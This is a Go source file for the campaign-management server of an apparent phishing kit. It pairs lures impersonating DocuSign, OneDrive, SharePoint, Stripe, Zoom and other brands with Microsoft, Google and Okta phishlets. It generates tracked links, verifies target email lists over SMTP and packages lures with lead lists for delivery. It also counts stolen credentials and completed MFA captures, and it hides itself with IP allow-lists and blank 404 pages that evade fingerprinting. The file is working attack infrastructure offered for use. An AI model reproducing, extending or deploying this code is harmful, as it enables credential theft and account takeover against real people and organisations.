package main

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"embed"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/strasser-lab/azure-phish-kit/campaign-manager/core"
	"golang.org/x/text/cases"
	"golang.org/x/text/language"
)

//go:embed templates/*
var templateFS embed.FS

// allowedNets holds parsed CIDRs from ALLOWED_IPS env var for IP-based access control.
var allowedNets []net.IPNet

func main() {
	port := flag.String("port", "9093", "listen port")
	token := flag.String("token", "", "auth token")
	storePath := flag.String("store", "../data/campaigns.json", "path to campaign store file")
	luresPath := flag.String("lures", "../../lures/attachments", "path to lures directory")
	phishletsPath := flag.String("phishlets", "../../proxy-server/phishlets", "path to phishlets directory")
	flag.Parse()

	// OPSEC env vars
	allowedIPs := os.Getenv("ALLOWED_IPS")

	// Parse ALLOWED_IPS into CIDRs for authMiddleware.
	if allowedIPs != "" {
		for _, cidr := range strings.Split(allowedIPs, ",") {
			cidr = strings.TrimSpace(cidr)
			_, n, err := net.ParseCIDR(cidr)
			if err != nil {
				log.Fatalf("FATAL: invalid CIDR in ALLOWED_IPS: %s (%v)", cidr, err)
			}
			allowedNets = append(allowedNets, *n)
			log.Printf("ALLOWED_IPS: granting access to %s", cidr)
		}
	}

	tmpl, err := template.ParseFS(templateFS, "templates/*.html")
	if err != nil {
		log.Fatalf("FATAL: cannot parse templates: %v", err)
	}

	store := core.NewStore(*storePath)
	lures := scanLures(*luresPath)
	phishlets := scanPhishlets(*phishletsPath)

	log.Printf("Loaded %d lures from %s", len(lures), *luresPath)
	log.Printf("Loaded %d phishlets from %s", len(phishlets), *phishletsPath)

	mux := http.NewServeMux()

	// Page routes — single SPA template
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		data := appPageData{
			Campaigns: store.List(),
			Lures:     lures,
			Phishlets: phishlets,
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := tmpl.ExecuteTemplate(w, "app.html", data); err != nil {
			log.Printf("[ERROR] template app: %v", err)
		}
	})

	mux.HandleFunc("GET /campaigns/{id}", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			http.NotFound(w, r)
			return
		}
		data := appPageData{
			Campaigns: store.List(),
			Selected:  &c,
			Lures:     lures,
			Phishlets: phishlets,
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := tmpl.ExecuteTemplate(w, "app.html", data); err != nil {
			log.Printf("[ERROR] template app: %v", err)
		}
	})

	// API routes
	mux.HandleFunc("POST /api/campaigns", func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid form"})
			return
		}
		name := strings.TrimSpace(r.FormValue("name"))
		lure := strings.TrimSpace(r.FormValue("lure"))
		phishlet := strings.TrimSpace(r.FormValue("phishlet"))
		if name == "" || lure == "" || phishlet == "" {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "name, lure, and phishlet are required"})
			return
		}
		c := core.Campaign{
			ID:        genID(),
			Name:      name,
			Lure:      lure,
			Phishlet:  phishlet,
			Status:    core.StatusDraft,
			CreatedAt: time.Now().UTC().Format(time.RFC3339),
		}
		store.Put(c)
		log.Printf("Created campaign %s (%s)", c.ID, c.Name)
		http.Redirect(w, r, "/campaigns/"+c.ID, http.StatusSeeOther)
	})

	mux.HandleFunc("POST /api/campaigns/{id}/link", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		if err := r.ParseForm(); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid form"})
			return
		}
		redirect := strings.TrimSpace(r.FormValue("redirect"))
		keyB64 := strings.TrimSpace(r.FormValue("key"))
		if keyB64 == "" {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "encryption key is required"})
			return
		}

		// Derive brand from phishlet name
		brand := "microsoft"
		switch {
		case strings.Contains(c.Phishlet, "google"):
			brand = "google"
		case strings.Contains(c.Phishlet, "okta"):
			brand = "okta"
		}
		templateName := strings.TrimSuffix(c.Lure, ".html")

		link, err := core.GenerateLink(keyB64, redirect, c.ID, brand, templateName, "")
		if err != nil {
			log.Printf("[ERROR] generate link: %v", err)
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		c.Link = link
		c.Status = core.StatusActive
		store.Put(c)
		writeJSON(w, http.StatusOK, map[string]string{"link": link})
	})

	mux.HandleFunc("POST /api/campaigns/{id}/verify", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}

		mode := r.URL.Query().Get("mode")
		if mode == "" {
			mode = "count"
		}

		// Handle file upload (optional for smtp mode if LeadFile already exists)
		var csvPath string
		file, _, err := r.FormFile("leads")
		if err == nil {
			defer file.Close()
			os.MkdirAll("../data/leads", 0755)
			csvPath = fmt.Sprintf("../../.glnt-data/leads/%s.csv", id)
			dst, err := os.Create(csvPath)
			if err != nil {
				writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to save file"})
				return
			}
			defer dst.Close()
			io.Copy(dst, file)
			c.LeadFile = csvPath
		} else if mode == "smtp" && c.LeadFile != "" {
			csvPath = c.LeadFile
		} else {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "CSV file upload required (field: leads)"})
			return
		}

		if mode == "smtp" {
			total, valid, invalid, catchAll, err := core.VerifyLeads(csvPath, true, "")
			if err != nil {
				writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
				return
			}
			c.LeadCount = total
			c.Status = core.StatusVerified
			store.Put(c)
			writeJSON(w, http.StatusOK, map[string]interface{}{
				"total":     total,
				"valid":     valid,
				"invalid":   invalid,
				"catch_all": catchAll,
				"status":    "ok",
				"mode":      "smtp",
			})
			return
		}

		// Default: count mode — count CSV lines
		f, err := os.Open(csvPath)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to read file"})
			return
		}
		defer f.Close()
		reader := csv.NewReader(f)
		count := 0
		for {
			_, err := reader.Read()
			if err != nil {
				break
			}
			count++
		}

		c.LeadCount = count
		c.Status = core.StatusVerified
		store.Put(c)
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"count":  count,
			"file":   csvPath,
			"status": "ok",
			"mode":   "count",
		})
	})

	mux.HandleFunc("GET /api/campaigns/{id}/preview", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		lureFile := filepath.Join(*luresPath, c.Lure)
		preview, err := core.PreviewLure(lureFile, c.Link)
		if err != nil {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "lure file not found"})
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(preview))
	})

	mux.HandleFunc("GET /api/events", func(w http.ResponseWriter, r *http.Request) {
		// Proxy analytics data for live stats in the campaign detail view
		eventsData := fetchEventsData()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(eventsData)
	})

	mux.HandleFunc("POST /api/campaigns/{id}/deploy", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}

		// Generate filled lure template
		lureFile := filepath.Join(*luresPath, c.Lure)
		filled, err := core.PreviewLure(lureFile, c.Link)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "lure file not found: " + c.Lure})
			return
		}

		// Read leads CSV (or use empty fallback)
		var leadsData []byte
		if c.LeadFile != "" {
			leadsData, err = os.ReadFile(c.LeadFile)
			if err != nil {
				leadsData = []byte("email\n")
			}
		} else {
			leadsData = []byte("email\n")
		}

		// Build README metadata
		readme := fmt.Sprintf("Campaign: %s\nLure: %s\nPhishlet: %s\nLink: %s\nLead Count: %d\nCreated: %s\n",
			c.Name, c.Lure, c.Phishlet, c.Link, c.LeadCount, c.CreatedAt)

		// Assemble ZIP in memory
		var buf bytes.Buffer
		zw := zip.NewWriter(&buf)

		fw, _ := zw.Create("lure.html")
		fw.Write([]byte(filled))

		fw, _ = zw.Create("leads.csv")
		fw.Write(leadsData)

		fw, _ = zw.Create("README.txt")
		fw.Write([]byte(readme))

		if err := zw.Close(); err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to create zip"})
			return
		}

		// Update status to deployed
		c.Status = core.StatusDeployed
		store.Put(c)

		// Sanitize campaign name for ZIP filename
		filename := strings.ToLower(strings.ReplaceAll(c.Name, " ", "-")) + ".zip"

		w.Header().Set("Content-Type", "application/zip")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
		w.Write(buf.Bytes())
	})

	// Catch-all 404 handler — avoids Go's default fingerprint
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body></body></html>"))
	})

	addr := ":" + *port
	log.Printf("Campaign Manager listening on http://localhost%s", addr)
	log.Fatal(http.ListenAndServe(addr, authMiddleware(*token, securityHeaders(mux))))
}

// ---------- Lure Scanning ----------

// LureInfo describes a single lure attachment.
type LureInfo struct {
	Filename  string `json:"filename"`
	Brand     string `json:"brand"`
	Icon      string `json:"icon"`
	Category  string `json:"category"`
}

var lureBrands = map[string]LureInfo{
	"adobe-contract.html":   {Filename: "adobe-contract.html", Brand: "Adobe Acrobat Sign", Icon: "A", Category: "document"},
	"docusign-wire.html":    {Filename: "docusign-wire.html", Brand: "DocuSign", Icon: "D", Category: "document"},
	"dropbox-share.html":    {Filename: "dropbox-share.html", Brand: "Dropbox Share", Icon: "B", Category: "file-share"},
	"excel-shared.html":     {Filename: "excel-shared.html", Brand: "Excel Shared", Icon: "X", Category: "document"},
	"gdocs-shared.html":     {Filename: "gdocs-shared.html", Brand: "Google Docs", Icon: "G", Category: "document"},
	"onedrive-file.html":    {Filename: "onedrive-file.html", Brand: "OneDrive", Icon: "O", Category: "file-share"},
	"sharepoint-doc.html":   {Filename: "sharepoint-doc.html", Brand: "SharePoint Document", Icon: "S", Category: "document"},
	"stripe-payment.html":   {Filename: "stripe-payment.html", Brand: "Stripe Payment", Icon: "$", Category: "payment"},
	"teams-recording.html":  {Filename: "teams-recording.html", Brand: "Teams Recording", Icon: "T", Category: "voip"},
	"zoom-recording.html":   {Filename: "zoom-recording.html", Brand: "Zoom Recording", Icon: "Z", Category: "voip"},
}

func scanLures(dir string) []LureInfo {
	var lures []LureInfo
	entries, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("[WARN] cannot read lures dir %s: %v", dir, err)
		// Return built-in lure definitions as fallback
		for _, l := range lureBrands {
			lures = append(lures, l)
		}
		return lures
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".html") {
			continue
		}
		if info, ok := lureBrands[e.Name()]; ok {
			lures = append(lures, info)
		} else {
			// Unknown lure file — derive brand from filename
			name := strings.TrimSuffix(e.Name(), ".html")
			name = strings.ReplaceAll(name, "-", " ")
			name = cases.Title(language.English).String(name)
			lures = append(lures, LureInfo{
				Filename: e.Name(),
				Brand:    name,
				Icon:     strings.ToUpper(name[:1]),
				Category: "other",
			})
		}
	}
	if len(lures) == 0 {
		for _, l := range lureBrands {
			lures = append(lures, l)
		}
	}
	return lures
}

// ---------- Phishlet Scanning ----------

// PhishletInfo describes a single phishlet.
type PhishletInfo struct {
	Name  string `json:"name"`
	Label string `json:"label"`
}

func scanPhishlets(dir string) []PhishletInfo {
	var phishlets []PhishletInfo
	entries, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("[WARN] cannot read phishlets dir %s: %v", dir, err)
		return phishlets
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			continue
		}
		var info struct {
			Name  string `json:"name"`
			Label string `json:"label"`
		}
		if json.Unmarshal(data, &info) == nil && info.Name != "" {
			if info.Label == "" {
				info.Label = info.Name
			}
			phishlets = append(phishlets, PhishletInfo{Name: info.Name, Label: info.Label})
		}
	}
	return phishlets
}

// ---------- Template Data Types ----------

type appPageData struct {
	Campaigns []core.Campaign
	Selected  *core.Campaign // nil when showing the "new campaign" form
	Lures     []LureInfo
	Phishlets []PhishletInfo
}

// ---------- Live Events Data ----------

type eventsSummary struct {
	Total      int    `json:"total"`
	PageLoads  int    `json:"page_loads"`
	Creds      int    `json:"credentials"`
	MFA        int    `json:"mfa_complete"`
	Rate       string `json:"rate"`
	LastCapture string `json:"last_capture"`
}

func fetchEventsData() *eventsSummary {
	dataPath := os.Getenv("EVENTS_PATH")
	if dataPath == "" {
		dataPath = "../data/captures.jsonl"
	}
	f, err := os.Open(dataPath)
	if err != nil {
		return &eventsSummary{Rate: "0", LastCapture: "no data"}
	}
	defer f.Close()

	es := &eventsSummary{}
	decoder := json.NewDecoder(f)
	for decoder.More() {
		var ev struct {
			Timestamp string `json:"timestamp"`
			EventType string `json:"event_type"`
		}
		if err := decoder.Decode(&ev); err != nil {
			continue
		}
		es.Total++
		switch ev.EventType {
		case "page_load":
			es.PageLoads++
		case "credential_submit":
			es.Creds++
		case "mfa_complete":
			es.MFA++
		}
		if ev.Timestamp > es.LastCapture {
			es.LastCapture = ev.Timestamp
		}
	}
	if es.Total > 0 {
		es.Rate = fmt.Sprintf("%.1f%%", float64(es.MFA)/float64(es.PageLoads)*100)
	} else {
		es.Rate = "0.0%"
	}
	if es.LastCapture == "" {
		es.LastCapture = "no data"
	}
	return es
}

// ---------- Utility ----------

func genID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ---------- Auth Middleware (same pattern as analytics-server) ----------

func authMiddleware(token string, next http.Handler) http.Handler {
	if token == "" && len(allowedNets) == 0 {
		return next
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// IP check: if ALLOWED_IPS is set, remote IP must match one of the CIDRs.
		if len(allowedNets) > 0 {
			ip := extractIP(r)
			ok := false
			for _, n := range allowedNets {
				if n.Contains(ip) {
					ok = true
					break
				}
			}
			if !ok {
				w.WriteHeader(http.StatusNotFound)
				w.Write([]byte("<html><body></body></html>"))
				return
			}
		}
		// Token check: cookie → query → auth header.
		if token != "" {
			if c, _ := r.Cookie("_auth"); c != nil && c.Value == token {
				next.ServeHTTP(w, r)
				return
			}
			if r.URL.Query().Get("token") == token {
				http.SetCookie(w, &http.Cookie{Name: "_auth", Value: token, Path: "/", MaxAge: 86400, HttpOnly: true, SameSite: http.SameSiteLaxMode})
				next.ServeHTTP(w, r)
				return
			}
			if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
				if strings.TrimPrefix(ah, "Bearer ") == token {
					next.ServeHTTP(w, r)
					return
				}
			}
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Denied</title><style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#090c10;color:#59616b;margin:0}.box{text-align:center;padding:40px;border:1px solid #1e2530;border-radius:8px;background:#11161e}.box h1{color:#e8ecf1;font-size:1rem;margin:0 0 8px}.box p{font-size:.8rem;margin:0}.box code{color:#4199f5;background:#091a30;padding:2px 8px;border-radius:4px;font-size:.75rem}</style></head><body><div class="box"><h1>Access Denied</h1><p>Add <code>?token=your-token</code> to the URL</p></div></body></html>`))
			return
		}
		next.ServeHTTP(w, r)
	})
}

func extractIP(r *http.Request) net.IP {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		ips := strings.Split(xff, ",")
		if ip := net.ParseIP(strings.TrimSpace(ips[0])); ip != nil {
			return ip
		}
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return net.ParseIP(r.RemoteAddr)
	}
	return net.ParseIP(host)
}

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}
